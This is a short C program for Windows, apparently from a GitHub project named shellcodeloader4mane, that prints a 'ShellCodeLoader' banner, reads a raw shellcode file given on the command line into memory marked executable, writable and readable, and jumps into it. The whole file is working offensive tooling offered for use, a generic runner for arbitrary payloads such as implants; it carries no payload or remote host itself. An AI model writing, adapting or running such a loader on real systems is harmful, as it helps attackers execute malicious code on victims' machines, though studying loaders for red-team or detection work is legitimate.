#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

typedef void (*fp) (void);

int getFileSize(FILE* filePointer)
{
	fseek(filePointer, 0L, SEEK_END);
	int size = ftell(filePointer);
	fseek(filePointer, 0L, SEEK_SET);
	return size;
}

int main(int argc, char const* argv[])
{ 
	printf("===========================================================================================================\n");
	printf(" #####                               #####                       #                                         \n");
	printf("#     # #    # ###### #      #      #     #  ####  #####  ###### #        ####    ##   #####  ###### ##### \n");
	printf("#       #    # #      #      #      #       #    # #    # #      #       #    #  #  #  #    # #      #    #\n");
	printf(" #####  ###### #####  #      #      #       #    # #    # #####  #       #    # #    # #    # #####  #    #\n");
	printf("      # #    # #      #      #      #       #    # #    # #      #       #    # ###### #    # #      ##### \n");
	printf("#     # #    # #      #      #      #     # #    # #    # #      #       #    # #    # #    # #      #   # \n");
	printf(" #####  #    # ###### ###### ######  #####   ####  #####  ###### #######  ####  #    # #####  ###### #    #\n");
	printf("-----------------------------------------------------------------------------------------------------------\n");
	printf("               ##   https://github.com/manesec/shellcodeloader4mane   x  @manesec   ##\n");
	printf("===========================================================================================================\n\n");

	if (argc == 2)
	{
		FILE* shellcode;
		errno_t err;

		err = fopen_s(&shellcode, argv[1], "rb");
		if (err == 0 && shellcode != NULL)
		{
			int len = getFileSize(shellcode);
			printf("[Info] Reading Shellcode length: %d\n", len);
			char* buffer = NULL;
			buffer = (char*)VirtualAlloc(NULL, len + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (buffer != NULL)
			{
				fread(buffer, len + 1, 1, shellcode);
				fclose(shellcode);
				fp loaded_shell = (fp)buffer;
				loaded_shell();


				printf("[INFO] Shell Loading Done.");
				VirtualFree(buffer, 0, MEM_RELEASE);
				return 0;
			}
			else
			{
				printf("[ERROR] Could not allocate memory for buffer.");
				return 1;
			}
		}
		else
		{
			perror("[ERROR] Can't load the shellcode.");
			return 1;
		}

	}
	else
	{
		printf("loadFromBinaryWithC.exe <mane.bin>");
		return 1;
	}
}